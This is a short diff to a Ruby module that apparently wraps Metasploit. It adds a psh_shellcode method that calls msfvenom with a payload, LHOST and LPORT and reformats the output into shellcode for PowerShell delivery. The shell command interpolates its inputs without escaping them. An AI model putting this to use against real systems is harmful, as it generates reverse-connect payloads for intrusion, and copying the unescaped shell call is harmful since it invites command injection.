@@ -111,7 +111,19 @@ module Lib_meta
 		else
 			print_bad("Resource file doesn't seem to exist at #{rc}...")
 		end
-	end
+  end
+
+  def psh_shellcode(payload, lhost, lport)
+    print_status('Generating shellcode!')
+    shellcode = `msfvenom --payload #{payload} LHOST=#{lhost} LPORT=#{lport} C`
+    shellcode = shellcode.gsub('\\', ',0')
+    shellcode = shellcode.delete('+')
+    shellcode = shellcode.delete('"')
+    shellcode = shellcode.delete("\n")
+    shellcode = shellcode.delete("\s")
+    shellcode[0..4] = ''
+    return shellcode
+  end
 
 	def build_payload(payload, lhost, lport)
 		seed = Random.rand(10000 + 1)
